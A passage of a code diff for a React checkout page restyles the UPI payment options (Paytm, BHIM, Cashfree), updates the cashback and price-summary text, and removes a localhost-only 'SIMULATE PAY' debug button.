-                                        onError={e=>{e.target.outerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="50px" height="50px" enable-background="new -164 191.6 512 193" viewBox="-164 191.6 512 193" id="paytm"><path fill="#02b9ef" d="M229.8,243.2c2-1.6,3-2.4,4-3.2c13.9-11.8,31.7-10.5,43.6,3.5c1.2,1.4,1.8,1.5,3,0.3c0.8-0.9,1.7-1.6,2.5-2.5   c9.3-9.1,21.6-11.8,33.1-6.7c12.1,5.4,18.6,14.9,18.7,28.2c0.2,28.7,0.1,57.3,0.1,86c0,10.2-6.3,16.6-16.4,16.6c-4,0-8-0.3-12,0.1   c-4.1,0.4-5.3-0.9-5.3-5.2c0.2-28,0.1-56,0.1-84c0-1.2,0-2.3,0-3.5c-0.1-6.5-2.7-9.2-8.9-9.5c-5.6-0.3-9.5,3.1-10.1,8.8   c-0.1,1.3,0,2.7,0,4c0,24.2,0,48.3,0,72.5c0,10.6-6.1,16.8-16.7,16.7c-5.4-0.1-12.7,2.4-15.8-1.1c-2.7-3-0.9-10.1-0.9-15.4   c0-24.8,0-49.7,0-74.5c0-8.8-5.7-13.3-13.1-10.3c-4.6,1.9-6.1,5.6-6.1,10.4c0.1,23.2,0,46.3,0,69.5c0,1.8,0,3.7,0,5.5   c-0.3,9.7-6.5,15.8-16.1,15.9c-4,0.1-8-0.3-12,0.1c-4.3,0.4-5.6-0.8-5.5-5.4c0.2-39.3,0.1-78.6,0.1-118c0-1.7,0.1-3.3,0-5   c-0.2-2.2,0.7-2.9,2.9-2.9c9.2,0.1,18.3,0.1,27.5,0c2.3,0,3.4,0.6,3.2,3.1C229.5,239,229.7,240.6,229.8,243.2z"></path><path fill="#06306f" d="M17.8 297.4c0 13.7 0 27.3 0 41-.1 17.8-9.4 27-27.2 27.1-7.8 0-15.7.1-23.5 0-15.8-.2-27.4-10.7-28.2-26.5-.6-11.3-.7-22.7-.1-34 .8-16.2 13.2-27.6 29.6-27.8 4.3-.1 8.7 0 13 0 4.2-.1 5.8-2.5 5.7-6.5 0-4-1.8-5.8-5.8-5.6-4.5.1-9 .1-13.5 0-11-.2-17.1-6.2-17-17 0-4.4-2-10.3.9-12.9 2.5-2.2 8.2-.8 12.5-.8 11.2-.1 22.3 0 33.5 0 11.9 0 20 8.1 20.1 20.1C17.9 268.7 17.8 283.1 17.8 297.4zM-12.8 320.1c0-1.7 0-3.3 0-5 0-10.2 0-10.2-10.2-9.8-5.1.2-7.9 2.8-8 8.1-.1 4.2-.1 8.3 0 12.5.1 7.2 3.3 9.1 13.7 9.4 7.7.2 3.8-5.2 4.5-8.2C-12.4 324.9-12.9 322.4-12.8 320.1zM106.8 286.5c0 15.3.2 30.7-.1 46-.2 11.8-3 22.5-14.4 28.8-4.6 2.5-9.6 3.9-14.8 4-11.5.2-23 0-34.5.2-2.8 0-3.4-1-3.3-3.5.2-4.2-.1-8.3.1-12.5.2-8 6.3-14.1 14.3-14.4 5.2-.2 10.3-.1 15.5 0 4.2 0 6.5-1.7 6.5-6.2 0-4.6-2.2-6.2-6.4-6.3-7-.2-14 .8-20.9-1.2-11.9-3.5-20.6-13.4-20.9-25.7-.6-19.5-.2-39-.3-58.5 0-2.2.7-2.9 2.9-2.8 8.2.1 16.3.2 24.5 0 3.6-.1 3.1 1.9 3.1 4.1 0 14.7 0 29.3 0 44 0 6.4 3 9.8 8.6 10 6.6.2 9.5-2.5 9.5-9.2 0-14.8.1-29.7-.1-44.5 0-3.5.9-4.5 4.4-4.4 7.3.3 14.7.4 22 0 4-.2 4.6 1.3 4.5 4.8C106.7 254.9 106.8 270.7 106.8 286.5zM-148 309.2c0-16.3 0-32.7 0-49 0-16 9.8-26 25.9-25.8 10.5.1 21-1.2 31.4.8 13.3 2.6 21.7 12.9 21.8 26.6.1 14.5 0 29 0 43.5 0 18.2-10.7 29.3-28.9 29.8-5.5.2-11 .1-16.5 0-2.5-.1-3.6.7-3.5 3.4.2 4 .1 8 0 12-.2 8.6-6.3 14.8-14.8 14.9-5 .1-11.3 2.1-14.5-.8-3-2.7-.8-9.1-.9-13.9C-148.1 336.9-148 323-148 309.2zM-117.8 284.7c0 3.2 0 6.3 0 9.5 0 11.3 0 11.3 11.3 10.3 4.9-.4 7.2-2.8 7.3-7.7.1-5.6-.2-11.3.1-16.9.6-16.2-2.4-14.6-15.6-14.7-2.4 0-3.2.7-3.2 3.1C-117.7 273.7-117.8 279.2-117.8 284.7z"></path><path fill="#02b9ef" d="M135.1,309.4c0-13.3-0.1-26.7,0.1-40c0-3.1-0.7-4.4-4.1-4.3c-4.5,0.2-10.5,1.5-13-0.7   c-3.1-2.9-0.7-9.1-1.1-13.9c0-0.3,0-0.7,0-1c0-4.7-1.5-10.2,0.5-13.7s8.1-1.3,12.4-2.4c8.5-2.2,14.9-7.1,20.1-13.9   c3.6-4.6,8.1-7.9,13.9-9c3.1-0.6,5-0.2,4.8,3.8c-0.3,5.6,0,11.3-0.1,17c-0.1,2.4,0.8,3.2,3.2,3.1c4-0.1,8,0.1,12-0.1   c2.4-0.1,3.2,0.8,3.1,3.2c-0.1,8.2-0.1,16.3,0,24.5c0,2.3-0.6,3.5-3.1,3.2c-0.5-0.1-1,0-1.5,0c-4.4,0.4-10.5-2-12.8,1   c-2.2,2.8-0.8,8.6-0.8,13.1c0,27.2-0.1,54.3,0.1,81.5c0,3.8-1,5-4.8,4.7c-3.6-0.3-7.3,0-11-0.1c-10.8-0.4-17.9-7.7-17.9-18.5   C135.1,334.4,135.1,321.9,135.1,309.4z"></path></svg>';}}
+                                    <img src="/assets/images/paytm_icon.svg" alt="Paytm" width={32} height={32}
+                                        onError={e=>{e.target.outerHTML='<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#00baf2"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="11" font-weight="bold">PayTM</text></svg>';}}
                                     />
                                 </div>
                             )}
 
                             {/* BHIM */}
                             {show.bhim && (
-                                <div className="pmt-opt" onClick={() => setActiveTab(1)}>
+                                <div className={`pmt-opt ${activeTab===1 ? 'active-opt' : ''}`} onClick={() => setActiveTab(1)} style={{"--theme-color": "#ea580c"}}>
                                     <div className="pmt-opt-left">
-                                        <input type="radio" name="upi" className="pmt-radio"
-                                            checked={activeTab===1} onChange={() => setActiveTab(1)} />
+                                        <div className={`pmt-radio-wrap ${activeTab===1 ? 'checked' : ''}`}>
+                                            <div className="pmt-radio-inner" />
+                                        </div>
                                         <div className="pmt-opt-info">
                                             <div className="pmt-opt-top">
                                                 <span>₹{totalMrp}</span>
@@ -595,7 +759,7 @@ export default function Payments() {
                                             <p className="pmt-opt-sub sub-bhim">Direct Bank Transfer</p>
                                         </div>
                                     </div>
-                                    <img src="https://upload.wikimedia.org/wikipedia/en/b/b3/Bhim_logo.png" alt="BHIM" width={30}
+                                    <img src="https://upload.wikimedia.org/wikipedia/en/b/b3/Bhim_logo.png" alt="BHIM" width={28} height={28}
                                         style={{objectFit:"contain"}}
                                     />
                                 </div>
@@ -603,10 +767,11 @@ export default function Payments() {
 
                             {/* Cashfree */}
                             {show.cashfree && (
-                                <div className="pmt-opt" onClick={() => setActiveTab(6)}>
+                                <div className={`pmt-opt ${activeTab===6 ? 'active-opt' : ''}`} onClick={() => setActiveTab(6)} style={{"--theme-color": "#334155"}}>
                                     <div className="pmt-opt-left">
-                                        <input type="radio" name="upi" className="pmt-radio"
-                                            checked={activeTab===6} onChange={() => setActiveTab(6)} />
+                                        <div className={`pmt-radio-wrap ${activeTab===6 ? 'checked' : ''}`}>
+                                            <div className="pmt-radio-inner" />
+                                        </div>
                                         <div className="pmt-opt-info">
                                             <div className="pmt-opt-top">
                                                 <span>₹{totalMrp}</span>
@@ -617,7 +782,7 @@ export default function Payments() {
                                         </div>
                                     </div>
                                     <svg width="52" height="22" viewBox="0 0 120 40">
-                                        <rect width="120" height="40" rx="4" fill="#1d3557"/>
+                                        <rect width="120" height="40" rx="4" fill="#334155"/>
                                         <text x="50%" y="55%" dominantBaseline="middle" textAnchor="middle"
                                             fill="#fff" fontSize="13" fontWeight="700" fontFamily="Inter,sans-serif">
                                             CASHFREE
@@ -631,15 +796,19 @@ export default function Payments() {
 
                     {/* ── CASHBACK BANNER ── */}
                     <div className="cashback-banner">
-                        <div className="cb-title">Cashback on First Order!</div>
+                        <div className="cb-title">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5 12 2"></polygon><line x1="12" y1="22" x2="12" y2="15.5"></line><polyline points="22 8.5 12 15.5 2 8.5"></polyline><polyline points="2 15.5 12 8.5 22 15.5"></polyline><line x1="12" y1="2" x2="12" y2="8.5"></line></svg>
+                            Cashback on First Order!
+                        </div>
                         <div className="cb-body">
                             Place your order and get <span className="cb-bold">₹{cashback}</span> cashback!
-                            Cashback will be credited to your original UPI payment method after delivery.
+                            Cashback will be automatically credited to your original UPI account after successful delivery.
                         </div>
                     </div>
 
                     {/* ── PRICE SUMMARY ── */}
                     <div className="price-box">
+                        <h4 className="price-box-title">Order Details</h4>
                         <div className="price-row">
                             <span>Price ({itemCount} item{itemCount!==1?"s":""})</span>
                             <span>₹ {totalMrp}</span>
@@ -649,17 +818,11 @@ export default function Payments() {
                             <span className="price-free">FREE</span>
                         </div>
                         <div className="price-row">
-                            <span>Discount fee</span>
+                            <span>Discount Price</span>
                             <span className="price-strike">₹ {crossedMrp}</span>
                         </div>
                         <div className="price-total-row">
-                            <div className="price-total-lbl">
-                                Total Amount
-                                <img src="/assets/images/uparrow.svg" alt="^" width={10} height={10}
-                                    style={{marginTop:2}}
-                                    onError={e=>{e.target.outerHTML='<svg width="10" height="10" viewBox="0 0 24 24" fill="none"><path d="M6 15l6-6 6 6" stroke="#2855E9" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';}}
-                                />
-                            </div>
+                            <div className="price-total-lbl">Total Amount</div>
                             <span className="price-total-amt">₹ {totalMrp}</span>
                         </div>
                     </div>
@@ -668,7 +831,7 @@ export default function Payments() {
                     <div className="secure-pay-wrap">
                         <img
                             src="/assets/images/SecurePay.svg"
-                            alt="Secure Pay"
+                            alt="100% Safe Payments"
                             className="secure-pay-img"
                             onError={e=>{e.target.style.display="none";}}
                         />
@@ -678,36 +841,15 @@ export default function Payments() {
 
                 {/* ══ STICKY FOOTER ══ */}
                 <div className="pmt-footer">
-                    <div className="pmt-footer-amt">
-                        ₹{totalMrp}
-                        {mounted && (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1") && (
-                            <div style={{ fontSize: "10px", color: "#ef4444", fontWeight: "bold", marginTop: "2px" }}>
-                                [LOCAL DEV]
-                            </div>
-                        )}
+                    <div className="pmt-footer-left">
+                        <span className="pmt-footer-lbl">Total Price</span>
+                        <div className="pmt-footer-amt">
+                            ₹{totalMrp}
+                        </div>
                     </div>
-                    {mounted && (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1") && (
-                        <button
-                            type="button"
-                            onClick={() => {
-                                const mockOrderId = `ORD-${Date.now()}`;
-                                window.location.href = `/ordersummdary?order_id=${mockOrderId}`;
-                            }}
-                            style={{
-                                background: "#ef4444",
-                                color: "#fff",
-                                fontWeight: "700",
-                                padding: "8px 16px",
-                                borderRadius: "8px",
-                                border: "none",
-                                fontSize: "12px",
-                                cursor: "pointer",
-                                marginRight: "10px"
-                            }}
-                        >
-                            SIMULATE PAY
-                        </button>
-                    )}
+                    
+
+
                     <button
                         className="pmt-pay-btn"
                         onClick={handlePay}
